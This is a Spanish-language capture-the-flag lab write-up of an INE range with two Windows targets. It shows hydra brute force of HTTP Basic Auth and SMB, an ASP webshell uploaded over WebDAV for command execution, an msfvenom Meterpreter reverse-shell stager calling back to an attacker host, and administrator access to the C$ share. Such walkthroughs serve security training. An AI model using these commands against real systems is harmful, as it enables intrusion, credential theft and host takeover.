---
title: "INE Windows CTF 1"
date: 2026-10-14
categories: [INE, Lab]
tags: [windows, iis, webdav, http basic auth, password brute force, credential reuse, webshell, asp, arbitrary file upload, RCE, smb, nmap, hydra, crackmapexec, curl, gobuster, davtest, cadaver, smbclient, metasploit, msfvenom]
image:
  path: /assets/img/INE/banner.webp
  lqip: "data:image/webp;base64,UklGRvYBAABXRUJQVlA4WAoAAAAQAAAAHwAACQAAQUxQSBsBAAABkGvb2rFX+3vf2LZt6/v/kcq2bds2S7W2U2WkykjLe7BtnxPnGiIiAQIK35cqQvA34aEE3wxAmeDLEvDK6Blb2LH2HEcTdRk+fDMAo8GCAK6O0TlBWlpqKtru1qrO4SlFVZkcbYCCEL9EqPvddw4/3VQD0LlLjjx5/9miBAKK0hQT3ffmseuF9xpQ0/fytZuU1NTEuIQE53ofUGi3REL1f8vUPibe42H5v3z5un/we0CGpyoT9uHcIEb9vWXylAiuvHPk3yuWXjd3dna2dzYNgXLDHgR4Qf1f88QhD5R2L0v+lW8cOLAclmW5ogAWnUivDtTfO+avGQKL3ff3wub3X1xQ4gvxVgKhKDNuAEChGBCtz3hGRnxHyoABAFZQOCC0AAAAEAQAnQEqIAAKAD7tYqpNqaWkIjAIATAdiWwAnS+PQAAckstmKzupqwQA/GAJj2rSsnYxXiIloZL4anV4YKPl3LHLvC5WLeJrDpnIPzMmd6LmX/pjUq/q5r1XGy4yigyPOyI1a1GJgQxa46PmT/1+xE/HXrwQ7OTEzbZr3K34pzTG4RCmid2FltrXI9eU4lqAE0H9ax/8f8/3/upMBKkfw2JGWEDjl+D/4/63ebP9L9oX4BAA"
  alt: INE Windows CTF 1 writeup
attack_path: false
---

Este es un laboratorio de práctica del curso de INE *Host & Network Penetration Testing: System-Host Based Attacks* — no es una máquina con ranking sino un **rango de dos objetivos Windows** para entrenar la superficie de ataque típica de Windows, así que este writeup se centra en *cómo* se usa cada herramienta más que en un único truco ingenioso. El **Target 1** es un servidor IIS cuyo HTTP Basic Auth cae ante una contraseña débil, exponiendo un directorio **WebDAV** escribible que ejecuta **ASP** subido — el clásico webshell-a-RCE. El **Target 2** es un Windows Server cuyas cuentas de SMB caen ante una fuerza bruta de credenciales, entregando acceso de administrador al recurso `C$` y las flags restantes.

| Campo      | Detalles       |
|------------|----------------|
| Plataforma | INE            |
| Dificultad | Lab            |
| SO         | Windows Server 2019 |
| Objetivos  | target1 (10.2.19.188) · target2 (10.2.28.91) |
| Fecha      | Octubre 2026   |

## Herramientas Usadas

| Herramienta  | Descripción                                                           |
|--------------|-----------------------------------------------------------------------|
| nmap         | Escaneo de puertos y fingerprinting de servicios de ambos objetivos  |
| hydra        | Fuerza bruta del HTTP Basic Auth (target 1) y de logins SMB (target 2)|
| crackmapexec | Validó las credenciales recuperadas sobre SMB                        |
| curl         | Peticiones autenticadas a IIS/WebDAV y disparo de la webshell        |
| gobuster     | Fuerza bruta de directorios autenticada que encontró `/webdav/`     |
| davtest      | Probó qué extensiones subidas se ejecutan de verdad en WebDAV        |
| cadaver      | Cliente WebDAV usado para subir la webshell ASP                      |
| smbclient    | Exploró el recurso administrativo `C$` del target 2                  |
| msfvenom     | Generó el payload aspx de Meterpreter (ruta alternativa)             |
| Metasploit   | `multi/handler` y `smb_login` — los equivalentes del framework       |

A ambos objetivos se llega por nombre tras mapearlos en `/etc/hosts`:

```text
10.2.19.188    target1.ine.local
10.2.28.91     target2.ine.local
```

> El laboratorio reasigna la IP de cada objetivo cuando el rango se reinicia, así que algunas salidas de comandos de abajo muestran direcciones distintas (p. ej. el target 2 como `10.2.18.174`, o la dirección NAT interna del target 1 `10.2.16.156`). Todas se refieren a los dos hosts de arriba.

## Target 1 — IIS y WebDAV (10.2.19.188)

### Escaneo de Puertos

```bash
nmap -p- --min-rate 5000 -sCV -Pn -n -oN nmap1 10.2.19.188
```

```bash
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
|_http-auth: Basic realm=10.2.19.188
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Lo que destaca es **IIS 10 en el puerto 80 tras un HTTP Basic Auth** (`401 Unauthorized`). El enunciado del laboratorio indica que un usuario **`bob`** tiene una contraseña débil — así que el realm es un objetivo de fuerza bruta, y WinRM/RDP/SMB dan sitios donde reutilizar lo que recuperemos.

### Crackear el HTTP Basic Auth con hydra

El módulo `http-get` de `hydra` repite `GET /` con cabeceras `Authorization: Basic` de un diccionario. `-l` fija el login a `bob`, `-P` aporta la lista de contraseñas:

```bash
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt http-get://10.2.19.188
```

```bash
[80][http-get] host: 10.2.19.188   login: bob   password: password_123321
```

(El `[WARNING] ... default path set to /` solo significa que hydra probó la raíz del sitio, que es justo el recurso protegido aquí.) Así que la credencial es **`bob:password_123321`**. Como `bob` es una cuenta local de Windows, conviene comprobar que la misma contraseña funciona en SMB — `crackmapexec` lo confirma en una línea:

```bash
crackmapexec smb target1.ine.local -u 'bob' -p 'password_123321'
# [+] EC2AMAZ-JVD17HK\bob:password_123321
```

### Encontrar WebDAV con un gobuster autenticado

Autenticándose con `curl -u` se obtiene la página de inicio por defecto de IIS — poco interesante por sí sola, así que el siguiente paso es el descubrimiento de contenido. Los flags `-U`/`-P` de `gobuster` llevan las credenciales de Basic Auth en cada petición para que el escaneo no rebote contra 401s:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -u http://target1.ine.local/ -U 'bob' -P 'password_123321'
```

```bash
/webdav               (Status: 301) [--> http://target1.ine.local/webdav/]
```

Un directorio **`/webdav/`** en una máquina IIS es una pista fuerte: WebDAV es la extensión de gestión de ficheros de HTTP, y si permite escritura *y* el servidor ejecuta lo que escribes, es ejecución remota de código.

### Enumerar el recurso WebDAV

```bash
curl -X GET http://target1.ine.local/webdav/ -u "bob:password_123321"
```

```text
flag1.txt    readme.txt    test.asp    web.config
```

```bash
curl http://target1.ine.local/webdav/flag1.txt -u "bob:password_123321"   # REDACTED
curl http://target1.ine.local/webdav/test.asp  -u "bob:password_123321"
# Classic ASP is enabled and working!
```

`flag1.txt` es la primera flag, y que `test.asp` devuelva *"Classic ASP is enabled and working!"* es el verdadero premio — prueba que el directorio **ejecuta ASP**, no solo lo sirve.

### Confirmar las extensiones ejecutables con davtest

Antes de subir un payload, `davtest` es la herramienta adecuada para confirmar *qué* extensiones se ejecutan. Hace `PUT` de una batería de ficheros de prueba (asp, aspx, php, jsp, …) y luego pide cada uno de vuelta para ver cuáles **se ejecutan** frente a los que solo se suben:

```bash
davtest -auth bob:password_123321 -url http://target1.ine.local/webdav
```

```text
PUT  asp   SUCCEED
EXEC asp   SUCCEED      <-- se ejecuta
EXEC aspx  SUCCEED
EXEC html  SUCCEED
EXEC txt   SUCCEED
```

`.asp` se sube y se ejecuta — así que una webshell ASP dará ejecución de comandos.

### Subir una webshell con cadaver → RCE

`cadaver` es un cliente WebDAV interactivo de línea de comandos — piensa en `ftp`, pero sobre WebDAV. Tras autenticarse, `put` sube una webshell ASP estándar directamente al directorio escribible:

```bash
cadaver http://target1.ine.local/webdav/
# Username: bob   Password: ********
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
# Progress: [====>] 100.0% succeeded.
```

La webshell toma un parámetro `cmd` en la query, así que los comandos corren por un `GET` autenticado normal. Codificando en URL `type \flag2.txt` (`%5C` es la barra invertida) se lee la segunda flag desde la raíz del disco:

```bash
curl "http://target1.ine.local/webdav/webshell.asp?cmd=type+%5Cflag2.txt" -u "bob:password_123321"
# ... <PRE> ... REDACTED
```

Eso es ejecución de comandos en el target 1 como la identidad del application pool de IIS, y **flag2** en la mano.

### Alternativa — un payload de Meterpreter

Como práctica, el mismo primitivo de subida puede entregar un payload de Metasploit en vez de una webshell de texto. `msfvenom` construye un stager Meterpreter `aspx`, `cadaver` lo sube, y un `multi/handler` espera:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.1.0.11 LPORT=4444 -f aspx -o shell.aspx
# dav:/webdav/> put shell.aspx
```

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.1.0.11:4444
```

Pedir `shell.aspx` dispara el callback y el handler **recibe la conexión**, pero la sesión de Meterpreter no llegó a establecerse del todo en esta ejecución (un resultado común cuando un payload x64 staged se encuentra con el contexto del app-pool / las defensas del host). La webshell ASP de arriba fue la ruta fiable — un buen recordatorio de que el primitivo de RCE más simple a menudo le gana al más pesado.

## Target 2 — Fuerza Bruta de SMB (10.2.28.91)

### Escaneo de Puertos

```bash
nmap -p- --min-rate 5000 -sCV -Pn -n -oN nmap2 10.2.28.91
```

```bash
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Datacenter 17763
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          WinRM
```

Esta vez no hay servidor web — la superficie es **SMB en el 445**. Sin ninguna pista sobre un usuario concreto, esto es una fuerza bruta completa de usuario *y* contraseña.

### Fuerza bruta de logins SMB con hydra

El módulo `smb` de `hydra` toma una lista de usuarios (`-L`) y una de contraseñas (`-P`). A SMB no le gustan las conexiones en paralelo, así que hydra baja automáticamente a una sola tarea:

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local
```

```bash
[445][smb] login: administrator   password: pineapple
[445][smb] login: auditor         password: hellokitty
[445][smb] login: demo            password: password1
```

Tres cuentas válidas, y una de ellas es **`administrator:pineapple`** — admin local, que es todo lo que necesitamos.

### Leer el recurso C$ con smbclient

Los derechos de administrador significan que el recurso administrativo oculto **`C$`** es legible — eso es todo el sistema de ficheros. `smbclient` lo explora directamente:

```bash
smbclient \\\\target2.ine.local\\C$ -U administrator
# Password: pineapple
smb: \> more flag3.txt                                   # REDACTED  (raíz del disco)
smb: \> cd Users\Administrator\Desktop\
smb: \> more flag4.txt                                   # REDACTED  (escritorio del admin)
```

`flag3.txt` está en la raíz de `C:` y `flag4.txt` en el escritorio del Administrador — ambas leídas sin abrir nunca una sesión interactiva, ya que `C$` expone el disco a cualquier admin local.

### Alternativa — Metasploit smb_login

El equivalente en el framework del spray con hydra es `auxiliary/scanner/smb/smb_login`, que valida un conjunto de usuario/contraseña contra SMB (y puede volcar los aciertos directamente al almacén de credenciales de Metasploit):

```text
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE  .../unix_users.txt
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE  .../unix_passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.2.28.91:445 - Success: '.\administrator:pineapple' Administrator
[+] 10.2.28.91:445 - Success: '.\auditor:hellokitty'
[+] 10.2.28.91:445 - Success: '.\demo:password1'
```

## Flags

| Flag        | Ubicación                                  | Valor      |
|-------------|--------------------------------------------|------------|
| `flag1.txt` | Target 1 — `/webdav/`                       | `REDACTED` |
| `flag2.txt` | Target 1 — `C:\` (RCE por webshell)         | `REDACTED` |
| `flag3.txt` | Target 2 — `C:\`                            | `REDACTED` |
| `flag4.txt` | Target 2 — Escritorio del Administrador     | `REDACTED` |

## Conclusiones Clave

- **Una pista de contraseña es una invitación a fuerza-brutear lo correcto.** "bob tiene una contraseña débil" apuntó hydra específicamente al realm del HTTP Basic Auth, así que una ejecución de un solo usuario lo crackeó en segundos. Acota el ataque a la credencial que te han dicho que existe.
- **La misma credencial local suele abarcar varios servicios.** La contraseña de HTTP Basic Auth de `bob` era también su contraseña de SMB — `crackmapexec` confirmó la reutilización al instante. Prueba siempre las credenciales recuperadas contra todos los servicios autenticados del escaneo.
- **WebDAV más scripts ejecutables es igual a RCE.** La cadena es siempre la misma: confirmar que el directorio es escribible, usar `davtest` para saber qué extensiones *se ejecutan*, y luego `cadaver` para subir una webshell en una de ellas. `test.asp` ya había revelado que Classic ASP estaba vivo.
- **Conoce el primitivo manual antes que el del framework.** La webshell ASP estándar dio ejecución de comandos limpia; el `aspx` de Meterpreter solo consiguió una conexión a medio abrir. En un engagement real el payload más ligero y mejor entendido suele ser más fiable que uno staged.
- **El acceso de admin por SMB es total vía `C$`.** Una vez que el spray devolvió `administrator:pineapple`, `smbclient \\host\C$` leyó el disco entero — sin necesidad de shell. Una contraseña de admin local expuesta en SMB es un compromiso total del host.
- **Como laboratorio, el objetivo es la fluidez con las herramientas.** Dos módulos de hydra (`http-get`, `smb`), `gobuster` autenticado, `davtest`, `cadaver`, `crackmapexec`, `smbclient`, y los equivalentes de Metasploit (`multi/handler`, `smb_login`) — los mismos bloques reutilizados en incontables objetivos Windows.
